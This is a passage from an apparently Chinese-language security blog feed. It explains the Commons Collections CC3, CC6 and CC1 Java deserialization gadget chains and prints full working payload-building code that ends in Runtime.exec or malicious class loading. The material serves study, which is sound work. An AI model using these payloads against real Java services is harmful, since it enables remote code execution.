src="/img/cc3/17439250641328.png"><br>这里主要判断defineClass的这个类的父类是否是ABSTRACT_TRANSLET 如果我们不选择进这个if的话 后面还要判断<code>_transletIndex</code> 虽然这个好像可以通过反射解决 但是还得处理<code>_auxClasses</code>空指针的问题 这位更是个transient 所以我们还是给恶意类继承一下 再把要override给做了就行</p><p>到这里可以结合CC1或者CC6 就是把原来的transformers[]数组中exec命令执行换成了加载恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>),<br>&#125;;<br></code></pre></td></tr></table></figure><p>但是CC3毕竟是CC3 由newTransformer上面还有路子可走<br>我们找到了TrAXFilter的构造函数<br><img src="/img/cc3/17439269897195.png"><br>但是TrAXFilter并没有继承Serializable 所以我们还得找一个可以序列化的类 正好能够调用TrAXFilter的构造函数<br>这里用transform嵌套其实也可以 和套几层序列化Runtime是一样的<br>但是没想到还有一个完美的类 能够序列化 还能直接调用构造函数并返回实例 并且方法还是transform<br><img src="/img/cc3/17439272126918.png"><br>把这个InstantiateTranformer实例化一个 再塞到transformers[]数组里就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">Gadget chain:<br>    ObjectInputStream.readObject() -&gt;<br>        AnnotationInvocationHandler.readObject() -&gt;<br>            MapEntry.setValue() -&gt;<br>                TransformedMap.checkSetValue -&gt;<br>                    ChainedTransformer.transform() -&gt;<br>                        ConstantTransformer.transform() -&gt;<br>                        InstantiateTransformer.transform -&gt;<br>                            TrAXFilter::TrAXFilter() -&gt;<br>                                TemplatesImpl::newTransformer() -&gt;<br>                                    TemplatesImpl::getTransletInstance() -&gt;<br>                                        TemplatesImpl::defineTransletClasses() -&gt;<br>                                            TransletClassLoader::defineClass()<br></code></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;jed&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;target/classes/evil.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br><br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),  <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                instantiateTransformer<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy);<br>        <span class="hljs-comment">// serialize(o);</span><br>        unserialize(<span class="hljs-string">&quot;sercc3.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object,String field_name,Object filed_value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        Class clazz=object.getClass();<br>        Field declaredField=clazz.getDeclaredField(field_name);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(object,filed_value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;sercc3.bin&quot;</span>));<br>        oos.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化之CC6</title>
    <link href="/2025/04/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC6/"/>
    <url>/2025/04/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC6/</url>
    
    <content type="html"><![CDATA[<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><p>参考：<a href="https://www.cnblogs.com/1vxyz/p/17447478.html">https://www.cnblogs.com/1vxyz/p/17447478.html</a><br>环境：<code>jdk8u65 &amp;&amp; commons-collections 3.2.1</code><br>适用：Commons-collections 3.1-3.2.1 &amp;&amp; jdk8u301 jdk11 jdk15 jdk16<br>sink点还是在InvokerTransformer::transform<br>实际上是CC1 LazyMap链上的一个变种 通过TiedMapEntry.hashcode()触发LazyMap.get()</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">Gadget chain:<br>    java.io.ObjectInputStream.readObject() -&gt;<br>        java.util.HashSet.readObject() -&gt;<br>            java.util.HashMap.put() -&gt;<br>            java.util.HashMap.hash() -&gt;<br>                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() -&gt;<br>                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() -&gt;<br>                    org.apache.commons.collections.map.LazyMap.get() -&gt;<br>                        org.apache.commons.collections.functors.ChainedTransformer.transform() -&gt;<br>                        org.apache.commons.collections.functors.InvokerTransformer.transform() -&gt;<br>                        java.lang.reflect.Method.invoke() -&gt;<br>                            java.lang.reflect.Method.invoke()<br></code></pre></td></tr></table></figure><p><img src="/img/cc6/17439173969768.png"><br>看一下LazyMap的get方法 想进入transform方法必须保证map中没有这个key<br><img src="/img/cc6/17439176070511.png"><br>我们从最后的HashMap.put()入手<br><img src="/img/cc6/17439180859439.png"><br>我们在之前给lazyMap的fatory属性直接赋了一个<code>ConstantTransformer(1)</code> 走到37行时 map2.put()已经触发了 而map2.put()会带来什么结果呢 实际上就直接到<code>tiedMapEntry.hashcode() -&gt; tiedMapEntry.getValue() -&gt; lazyMap.get(&quot;aaa&quot;)</code> 然后就是给aaa这个key赋了个Integer(1)<br>あれ 我的HashSet呢? 调试了挺久的 说实话没看出来到底remove了没有 在进到unserialize之前lazyMap.map.containsKey(“aaa”)一直是true 为什么用序列化数据之后进到LazyMap::get()里之后就是false了呢<br>用HashMap也是可以的(URLDNS链的入口) 这两个readObejct()都可以导到HashMap::hashCode()<br>给出payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;touch aaa&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br><span class="hljs-comment">//        HashMap方法</span><br><span class="hljs-comment">//        HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        map2.put(tiedMapEntry,&quot;bbb&quot;);</span><br>        <span class="hljs-comment">//本地执行put时，会调用 tiedMapEntry.hashcode lazyMap.get(&quot;aaa&quot;) 会让lazyMap key不为false</span><br><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashSet.add(tiedMapEntry);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);  <span class="hljs-comment">//remove掉put时 lazyMap里的key 使反序列化时能进入transform</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazyMap,chainedTransformer);<br>        <span class="hljs-comment">// 反射修改lazyMap里的factory</span><br>        <span class="hljs-comment">// serialize(hashSet);</span><br>        <span class="hljs-comment">// unserialize(&quot;sercc6.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;sercc6.bin&quot;</span>));<br>        oos.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化之CC1</title>
    <link href="/2025/04/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1/"/>
    <url>/2025/04/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1/</url>
    
    <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>参考：<a href="https://www.cnblogs.com/1vxyz/p/17284838.html">https://www.cnblogs.com/1vxyz/p/17284838.html</a><br>环境：<code>jdk8u65 &amp;&amp; commons-collections 3.2.1</code><br>CC1在jdk8u71后就修复了(修了AnnotationInvocationHandler::readObject())<br>sink点在 InvokerTransformer::transform()</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">Gadget chain:<br>    ObjectInputStream.readObject() -&gt;<br>        AnnotationInvocationHandler.readObject() -&gt;<br>            MapEntry.setValue() -&gt;<br>                TransformedMap.checkSetValue -&gt;<br>                    ChainedTransformer.transform() -&gt;<br>                        ConstantTransformer.transform() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Class.getMethod() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Runtime.getRuntime() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Runtime.exec()<br></code></pre></td></tr></table></figure><p>Runtime对象不能序列化(没有继承Serializable) 我们需要一直用InvokerTransformer::transform()来反射获取<code>Runtime.getRuntime().exec(&quot;cmd&quot;)</code><br>这里详解一下InvokerTransformer::transform()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>        <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>                <br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以<code>new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class)</code>为例<br>首先明确 InvokerTransformer的构造函数接收(String, Class[], Object[])<br>所以这里的iMethodName是”getMethod”<br>paramTypes是{String.class, Class[].class}<br>iArgs是{“getRuntime”, null}<br>input是Runtime.class<br>进到try语句里看 不妨把输出都打印出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;cls:&quot;</span> + Runtime.class.getClass());<br>System.out.println(<span class="hljs-string">&quot;method:&quot;</span> + Runtime.class.getClass().getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;));<br>-&gt;<br>cls:<span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.Class<br>method:<span class="hljs-keyword">public</span> java.lang.reflect.Method java.lang.Class.getMethod(java.lang.String,java.lang.Class[]) <span class="hljs-keyword">throws</span> java.lang.NoSuchMethodException,java.lang.SecurityException<br></code></pre></td></tr></table></figure><p>可能会对传入的paramTypes有点疑惑 实际上就是反射调用Class::getMethod的时候 要让paramTypes &#x3D; 你getMethod得到的这个方法需要传入的参数<br>像这里是调用getMethod得到getMethod 而getMethod的参数是(String, Class&lt;?&gt;…)<br>所以传入的是{String.class, Class[].class} 同时iParamTypes的类型是Class[] 故也就是 new Class[] {String.class, Class[].class}<br><img src="/img/cc1/17437517675805.png"><br>用getMethod得到getMethod可能有点绕 可以用第二个getMethod -&gt; <code>new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, null&#125;).transform(prev)</code>得到invoke来解释<br><img src="/img/cc1/17437522556272.png"><br>这里invoke的参数是(Object, Object…) 所以最终传入的是 new Class[] {Object.class, Object[].class}</p><p>OK解释完getMethod 接着解释一下InvokerTransformer::transform的invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;invoke return:&quot;</span> + Runtime.class.getClass().getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;).invoke(Runtime.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;));<br>-&gt;<br>invoke <span class="hljs-keyword">return</span>:<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.lang.Runtime java.lang.Runtime.getRuntime()<br></code></pre></td></tr></table></figure><p>我们知道invoke会返回一个Object 打断点调试之后看到返回的是Method对象 也就是java.lang.Runtime.getRuntime()这个Method对象 -&gt; 这个东西不是class 是Method extends Object<br><img src="/img/CC1/17437537963124.png"><br>而这个Method对象即将是我们下一个的transform(input)的传入<br>我们需要知道最后执行命令是在<code>return method.invoke(input, iArgs);</code><br>接下来我们把三次反射在transform中的cls, method, invoke_return都打印出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;cls: &quot;</span> + Runtime.class.getClass());<br>System.out.println(<span class="hljs-string">&quot;method: &quot;</span> + Runtime.class.getClass().getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;));<br><span class="hljs-type">Object</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> Runtime.class.getClass().getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;).invoke(Runtime.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;);<br>System.out.println(<span class="hljs-string">&quot;invoke return: &quot;</span> + a);<br>System.out.println(<span class="hljs-string">&quot;cls_2: &quot;</span> + a.getClass());<br>System.out.println(<span class="hljs-string">&quot;method_2: &quot;</span> + a.getClass().getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;));<br><span class="hljs-type">Object</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a.getClass().getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;).invoke(a, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;);<br>System.out.println(<span class="hljs-string">&quot;invoke return_2: &quot;</span> + b);<br>System.out.println(<span class="hljs-string">&quot;cls_3: &quot;</span> + b.getClass());<br>System.out.println(<span class="hljs-string">&quot;method_3: &quot;</span> + b.getClass().getMethod(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;));<br><span class="hljs-type">Object</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> b.getClass().getMethod(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;).invoke(b, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;touch aaa&quot;</span>&#125;);<br>System.out.println(<span class="hljs-string">&quot;invoke return_3: &quot;</span> + c);<br>System.out.println(<span class="hljs-string">&quot;get all done&quot;</span>);<br>-&gt;<br>cls: <span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.Class<br>method: 